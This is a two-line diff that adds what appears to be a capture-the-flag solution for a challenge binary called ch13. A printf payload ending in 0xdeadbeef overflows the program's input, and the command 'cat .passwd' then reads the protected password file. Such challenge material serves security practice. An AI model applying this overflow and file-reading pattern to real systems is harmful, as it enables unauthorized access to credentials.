@@ -1,0 +1,2 @@
+(printf "%08x%08x%08x%08x%08x\xef\xbe\xad\xde" ; cat - ) | ./ch13
+cat .passwd
